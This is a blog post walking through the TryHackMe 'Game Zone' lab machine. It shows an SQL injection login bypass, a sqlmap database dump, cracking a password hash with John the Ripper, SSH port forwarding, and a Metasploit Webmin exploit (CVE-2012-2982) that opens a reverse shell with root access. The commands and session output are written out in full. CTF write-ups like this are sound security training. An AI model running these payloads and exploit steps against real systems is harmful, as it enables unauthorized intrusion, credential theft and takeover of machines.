<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="THM - Game Zone" /><meta property="og:locale" content="en" /><meta name="description" content="4th challenge of the Advanced Exploitation module called Game Zone." /><meta property="og:description" content="4th challenge of the Advanced Exploitation module called Game Zone." /><link rel="canonical" href="http://blueh0rse.github.io/posts/thm-gamezone/" /><meta property="og:url" content="http://blueh0rse.github.io/posts/thm-gamezone/" /><meta property="og:site_name" content="blueh0rse" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-08-15T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="THM - Game Zone" /><meta name="twitter:site" content="@blueh0rse_" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-03-05T01:03:43+01:00","datePublished":"2022-08-15T00:00:00+02:00","description":"4th challenge of the Advanced Exploitation module called Game Zone.","headline":"THM - Game Zone","mainEntityOfPage":{"@type":"WebPage","@id":"http://blueh0rse.github.io/posts/thm-gamezone/"},"url":"http://blueh0rse.github.io/posts/thm-gamezone/"}</script><title>THM - Game Zone | blueh0rse</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="blueh0rse"><meta name="application-name" content="blueh0rse"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/blueh0rse.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">blueh0rse</a></div><div class="site-subtitle font-italic">personal cybersecurity blog :)</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/blueh0rse" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/blueh0rse_" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['blueh0rse','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>THM - Game Zone</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>THM - Game Zone</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1660514400" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Aug 15, 2022 </em> </span> <span> Updated <em class="" data-ts="1709597023" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Mar 5, 2024 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/blueh0rse">blueh0rse</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1549 words"> <em>8 min</em> read</span></div></div></div><div class="post-content"><p>4th challenge of the <em>Advanced Exploitation</em> module called <strong>Game Zone</strong>.</p><p>On the introduction of the challenge we can read that we will use some SQL injection manually then using SQLMap. Plus we will do some password cracking, manipulating SSH tunnels to reveal a hidden service and use Metasploit to gain root privileges.</p><p>First thing to do: deploy the machine.</p><blockquote class="prompt-warning"><div><p>For this writeup I will say that the IP adresses are the following:</p><ul><li><p><strong>attack machine</strong> is <code class="language-plaintext highlighter-rouge">10.10.10.1</code></p><li><p><strong>target machine</strong> is <code class="language-plaintext highlighter-rouge">10.10.10.2</code></p></ul></div></blockquote><h1 id="task-1---deploy-the-vulnerable-machine">Task #1 - Deploy the vulnerable machine</h1><p>Now the machine is online we can start doing some port enumeration with <code class="language-plaintext highlighter-rouge">nmap</code>.</p><p>We will do a basic scan like:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-vv</span> 10.10.10.2
</pre></table></code></div></div><dl><dt>Little explanation of the options :<dt>-sC<dd>Performs a script scan using the default set of scripts. It is equivalent to ‚Äìscript=default. Some of the scripts in this category are considered intrusive and should not be run against a target network without permission.<dt>-sV<dd>Enables version detection<dt>-vv<dd>Max verbosity level</dl><p>After few minutes we can see two interesting running services :</p><ul><li>Port 80 : http server named ‚ÄòGame Zone‚Äô<li>Port 22 : ssh OpenSSH 7.2p2</ul><p>Let‚Äôs see the web server first.</p><p>We can easily identify Hitman on the landing page but I don‚Äôt kow his real name. After googling it :</p><blockquote class="prompt-tip"><div><p>What is the name of the large cartoon avatar holding a sniper on the forum?</p><p><strong>agent 47</strong></p></div></blockquote><h1 id="task-2---obtain-access-via-sqli">Task #2 - Obtain access via SQLi</h1><p>SQL is a standard language for storing, editing and retrieving data in databases. A query can look like so:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="n">my_password</span> <span class="k">AND</span> <span class="n">password</span> <span class="o">=</span> <span class="n">my_password</span>
</pre></table></code></div></div><p>Because we don‚Äôt have a valid username/password pair we will try to bybass the authentication form using SQL injection.</p><p>In the login field I write <code class="language-plaintext highlighter-rouge">username = ' or 1=1 -- -</code></p><p>Instead of giving a username and a password to the form I simply escape the username input using the <code class="language-plaintext highlighter-rouge">'</code> because strings are always stored between <code class="language-plaintext highlighter-rouge">' '</code> or <code class="language-plaintext highlighter-rouge">" "</code>. Then I add the condition <code class="language-plaintext highlighter-rouge">or 1=1</code> and comment all the rest of the query with the double dashes <code class="language-plaintext highlighter-rouge">--</code>.</p><blockquote class="prompt-info"><div><p>In simple words it will say to the database:</p><p><strong>If 1=1 the user is authenticated</strong>.</p></div></blockquote><blockquote class="prompt-tip"><div><p>When you‚Äôve logged in, what page do you get redirected to?</p><p><strong>portal.php</strong></p></div></blockquote><h1 id="task-3---using-sqlmap">Task #3 - Using SQLMap</h1><p>We will use SQLMap to dump all the database info. We first have to capture a request within Burp of the search bar in portal.php</p><p>You can put anything you want in the search bar and intercept the request. Copy all the raw body in a text file (req.txt for exemple). To make it works I had to remove all the blank lines of the file except the one before <strong>searchitem</strong> (the last line)</p><p>Now we can use SQLMap like this</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-r</span> req.txt <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">--dump</span>
</pre></table></code></div></div><dl><dt>Where:<dt>‚Äìr<dd>specifies a file containin the request<dt>‚Äîdbms<dd>specifies which Database Management System is used by the website<dt>‚Äîdump<dd>Dump DBMS database table entries</dl><p>Here it‚Äôs said that the dbms is MySQL but in real cases we would have to do some enumeration to identify it.</p><p>Now we have to wait a moment for SQLMap to finish. If asked to extend the tests for MySQL answer <code class="language-plaintext highlighter-rouge">Y</code>. If asked anything else you can answer <code class="language-plaintext highlighter-rouge">y</code>.</p><p>When SQLMap finished we can see 2 tables in the database : <strong>users</strong> and <strong>post</strong>. In <em>users</em> SQLMap found just one entry and gave us the hashed password and the username related.</p><blockquote class="prompt-tip"><div><p>In the users table, what is the hashed password?</p><p><strong>If you followed the steps it should appears on your screen when SQLMap ends.</strong></p></div></blockquote><blockquote class="prompt-tip"><div><p>What was the username associated with the hashed password?</p><p><strong>agent47</strong></p></div></blockquote><blockquote class="prompt-tip"><div><p>What was the other table name?</p><p><strong>post</strong></p></div></blockquote><h1 id="task-4---cracking-a-password-with-johntheripper">Task #4 - Cracking a password with JohnTheRipper</h1><p>Now that we have a username and a hashed password we can try to crack the hash to reveal it. for This we will use John The Ripper a 15y old very famous cracking program.</p><p>The basic command is the following :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>john @hash <span class="nt">--wordlist</span><span class="o">=</span>@wordlist <span class="nt">--format</span><span class="o">=</span>@format
</pre></table></code></div></div><ul><li><dl><dt>@hash<dd>the file containing the hash(es) (hash.txt for exemple)</dl><li><dl><dt>@wordlist<dd>the worlist (rockyou.txt for exemple)</dl><li><dl><dt>@format<dd>the hash(es) type (md5crypt for exemple)</dl></ul><blockquote class="prompt-info"><div><p>To list all the supported formats by john you can use the following command:</p><p><code class="language-plaintext highlighter-rouge">john --list=formats</code></p></div></blockquote><p>Before using john we first have to identify the hashtype of the discovered hash. For this there are many websites which can help you finding the type, I personally use <a href="https://www.tunnelsup.com/hash-analyzer/"><strong>Tunnels UP</strong></a>.</p><p>After finding the good hash format we can now launch <code class="language-plaintext highlighter-rouge">john</code>.</p><p>In few seconds we obtain the password.</p><blockquote class="prompt-tip"><div><p>What is the de-hashed password?</p><p><strong>if you followed the previous steps <em>john</em> should give it to you very quickly</strong></p></div></blockquote><p>We can now try to log into the machine using ssh</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ssh agent47@10.10.10.2
</pre></table></code></div></div><blockquote class="prompt-tip"><div><p>What is the user flag?.</p><p><strong>Just <code class="language-plaintext highlighter-rouge">ls</code> and the flag is there.</strong></p></div></blockquote><h1 id="task-5---exposing-services-with-reverse-ssh-tunnels">Task #5 - Exposing services with reverse SSH tunnels</h1><p>Now using a tool called <code class="language-plaintext highlighter-rouge">ss</code> we will look at the running sockets on the victim machine.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="gp">agent47@gamezone:~$</span><span class="w"> </span>ss <span class="nt">-tulnp</span>
<span class="go">Netid  State      Recv-Q Send-Q                  Local Address:Port                                 Peer Address:Port              
udp    UNCONN     0      0                                   *:10000                                           *:*                  
udp    UNCONN     0      0                                   *:68                                              *:*                  
tcp    LISTEN     0      128                                 *:10000                                           *:*                  
tcp    LISTEN     0      128                                 *:22                                              *:*                  
tcp    LISTEN     0      80                          127.0.0.1:3306                                            *:*                  
tcp    LISTEN     0      128                                :::80                                             :::*                  
tcp    LISTEN     0      128                                :::22                                             :::*      
</span></pre></table></code></div></div><dl><dt>Here are the detailed options:<dt>‚Äìt<dd>Display TCP sockets<dt>‚Äìu<dd>Display UDP sockets<dt>‚Äìl<dd>Displays only listening sockets<dt>‚Äìn<dd>Doesn‚Äôt resolve service names<dt>‚Äìp<dd>Shows the process using the socket</dl><blockquote class="prompt-tip"><div><p>How many TCP sockets are running?</p><p><strong>5</strong></p></div></blockquote><p>We can identify a service running on port <code class="language-plaintext highlighter-rouge">10000</code> but can‚Äôt be accessed from outside because blocked by a firewall.</p><p>We will use a ssh tunnel from our mmachine to redirect the traffic of the blocked service to our localhost interface. Thus we will be able to see and interact with the blocked content.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>ssh <span class="nt">-L</span> 10000:localhost:10000 agent47@10.10.10.2
firefox localhost:10000 &amp;
</pre></table></code></div></div><p>If it works we should arrive to a login page where you can instantly identify the CMS used.</p><blockquote class="prompt-tip"><div><p>What is the name of the exposed CMS?</p><p><strong>Webmin</strong></p></div></blockquote><p>Now we need to find the credentials to access the admin panel.</p><p>I first tried <code class="language-plaintext highlighter-rouge">admin:admin</code> in the login form but it failed. Then I looked on internet for the default creds and they said it‚Äôs the root user (thus the user we are logged in with ssh).</p><p>When logged in it is not hard to find the CMS version.</p><blockquote class="prompt-tip"><div><p>What is the CMS version?</p><p><strong>1.580</strong></p></div></blockquote><h1 id="tasks-6---privilege-escalation-with-metasploit">Tasks #6 - Privilege escalation with Metasploit</h1><p>We have a CMS name and a version. Now time to look for vulnerabilities.</p><p>After some researches I found that this server was vulnerable to a CVE : <strong>CVE-2012-2982</strong>.</p><p>Let‚Äôs play with <code class="language-plaintext highlighter-rouge">metasploit</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>msfconsole <span class="nt">-q</span>
<span class="gp">msf5 &gt;</span><span class="w"> </span>search CVE-2012-2982
<span class="go">
Matching Modules
================
</span><span class="gp">   #</span><span class="w">  </span>Name                                      Disclosure Date  Rank       Check  Description
<span class="go">   -  ----                                      ---------------  ----       -----  -----------
   0  exploit/unix/webapp/webmin_show_cgi_exec  2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
</span></pre></table></code></div></div><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="gp">msf5 &gt;</span><span class="w"> </span>use 0
<span class="gp">msf5 exploit(unix/webapp/webmin_show_cgi_exec) &gt;</span><span class="w"> </span><span class="nb">set </span>payload cmd/unix/reverse
<span class="gp">payload =&gt;</span><span class="w"> </span>cmd/unix/reverse
<span class="gp">msf5 exploit(unix/webapp/webmin_show_cgi_exec) &gt;</span><span class="w"> </span>show options
<span class="go">
Module options (exploit/unix/webapp/webmin_show_cgi_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   yes       Webmin Password
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
</span><span class="gp">   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;</span><span class="s1">'
</span><span class="go">   RPORT     10000            yes       The target port (TCP)
   SSL       true             yes       Use SSL
   USERNAME                   yes       Webmin Username
   VHOST                      no        HTTP server virtual host


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin 1.580
</span></pre></table></code></div></div><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="gp">msf5 exploit(unix/webapp/webmin_show_cgi_exec) &gt;</span><span class="w"> </span><span class="nb">set </span>LHOST 10.10.10.1
<span class="gp">LHOST =&gt;</span><span class="w"> </span>10.10.10.1
<span class="gp">msf5 exploit(unix/webapp/webmin_show_cgi_exec) &gt;</span><span class="w"> </span><span class="nb">set </span>RHOSTS 127.0.0.1
<span class="gp">RHOSTS =&gt;</span><span class="w"> </span>127.0.0.1
<span class="gp">msf5 exploit(unix/webapp/webmin_show_cgi_exec) &gt;</span><span class="w"> </span><span class="nb">set </span>SSL <span class="nb">false</span>
<span class="go">[!] Changing the SSL option's value may require changing RPORT!
</span><span class="gp">SSL =&gt;</span><span class="w"> </span><span class="nb">false</span>
<span class="gp">msf5 exploit(unix/webapp/webmin_show_cgi_exec) &gt;</span><span class="w"> </span><span class="nb">set </span>RPORT 10000
<span class="gp">RPORT =&gt;</span><span class="w"> </span>10000
<span class="gp">msf5 exploit(unix/webapp/webmin_show_cgi_exec) &gt;</span><span class="w"> </span><span class="nb">set </span>USERNAME agent47
<span class="gp">username =&gt;</span><span class="w"> </span>agent47
<span class="gp">msf5 exploit(unix/webapp/webmin_show_cgi_exec) &gt;</span><span class="w"> </span><span class="nb">set </span>PASSWORD videogamer124
<span class="gp">PASSWORD =&gt;</span><span class="w"> </span>videogamer124
</pre></table></code></div></div><p>Now everything is set we can run it.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="gp">msf5 exploit(unix/webapp/webmin_show_cgi_exec) &gt;</span><span class="w"> </span>run
<span class="go">
[*] Started reverse TCP double handler on 10.10.10.1:4444 
[*] Attempting to login...
[+] Authentication successfully
[+] Authentication successfully
[*] Attempting to execute the payload...
[+] Payload executed successfully
[*] Accepted the first client connection...
[*] Accepted the second client connection...
</span><span class="gp">[*] Command: echo 7Fb8i0Az0Jq2XHQd;</span><span class="w">
</span><span class="go">[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "7Fb8i0Az0Jq2XHQd\r\n"
[*] Matching...
[*] B is input...
</span><span class="gp">[*] Command shell session 1 opened (10.10.10.1:4444 -&gt;</span><span class="w"> </span>10.10.105.217:50912<span class="o">)</span> at 2022-08-17 17:43:52 +0100
<span class="go">
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>What is the root flag?</p><p><strong>Execute <code class="language-plaintext highlighter-rouge">cat /root/root.txt</code> and you will get it</strong></p></div></blockquote><h1 id="conclusion">Conclusion</h1><p>A cool challenge introducing SSH tunnels with a mix of web and privesc.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/tryhackme/'>TryHackMe</a>, <a href='/categories/rooms/'>Rooms</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >tryhackme</a> <a href="/tags/sqli/" class="post-tag no-text-decoration" >sqli</a> <a href="/tags/ssh/" class="post-tag no-text-decoration" >ssh</a> <a href="/tags/privesc/" class="post-tag no-text-decoration" >privesc</a> <a href="/tags/hash/" class="post-tag no-text-decoration" >hash</a> <a href="/tags/metasploit/" class="post-tag no-text-decoration" >metasploit</a> <a href="/tags/cve/" class="post-tag no-text-decoration" >cve</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://www.gnu.org/licenses/gpl-3.0.en.html"> GNU GPLv3 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=THM+-+Game+Zone+-+blueh0rse&url=http%3A%2F%2Fblueh0rse.github.io%2Fposts%2Fthm-gamezone%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=THM+-+Game+Zone+-+blueh0rse&u=http%3A%2F%2Fblueh0rse.github.io%2Fposts%2Fthm-gamezone%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=http%3A%2F%2Fblueh0rse.github.io%2Fposts%2Fthm-gamezone%2F&text=THM+-+Game+Zone+-+blueh0rse" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htb-nibbles/">üü¢ HTB - Nibbles</a><li><a href="/posts/ejpt-cheatsheet/">üìú eJPT Cheatsheet</a><li><a href="/posts/htb-preignition/">üîµ HTB - Preignition</a><li><a href="/posts/htb-redeemer/">üîµ HTB - Redeemer</a><li><a href="/posts/htb-appointment/">üîµ HTB - Appointment</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/portswigger/">portswigger</a> <a class="post-tag" href="/tags/gobuster/">gobuster</a> <a class="post-tag" href="/tags/ejpt/">ejpt</a> <a class="post-tag" href="/tags/auth/">auth</a> <a class="post-tag" href="/tags/blind/">blind</a> <a class="post-tag" href="/tags/bruteforce/">bruteforce</a> <a class="post-tag" href="/tags/buffer/">buffer</a> <a class="post-tag" href="/tags/cewl/">cewl</a></div></div></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-appointment/"><div class="card-body"> <em class="small" data-ts="1692223200" data-df="ll" > Aug 17, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>üîµ HTB - Appointment</h3><div class="text-muted small"><p> What does the acronym SQL stand for? Structured Query Language What is one of the most common type of SQL vulnerabilities? sql injection What is the 2021 OWASP Top 10 classification for this vu...</p></div></div></a></div><div class="card"> <a href="/posts/psa-sqli-1/"><div class="card-body"> <em class="small" data-ts="1677711600" data-df="ll" > Mar 2, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>üï∏Ô∏è PSA - SQLi 1 - SQLi in WHERE clause</h3><div class="text-muted small"><p> Difficulty : Apprentice üéØ Goal Show all the products no matter the category. ‚úÖ Solution Initial request: 1 &amp;lt;website&amp;gt;/products?category=Gifts With payload: 1 &amp;lt;website&amp;gt;/products?c...</p></div></div></a></div><div class="card"> <a href="/posts/psa-sqli-2/"><div class="card-body"> <em class="small" data-ts="1677711600" data-df="ll" > Mar 2, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>üï∏Ô∏è PSA - SQLi 2 - SQLi Allowing Authentication Bypass</h3><div class="text-muted small"><p> Difficulty : Apprentice üéØ 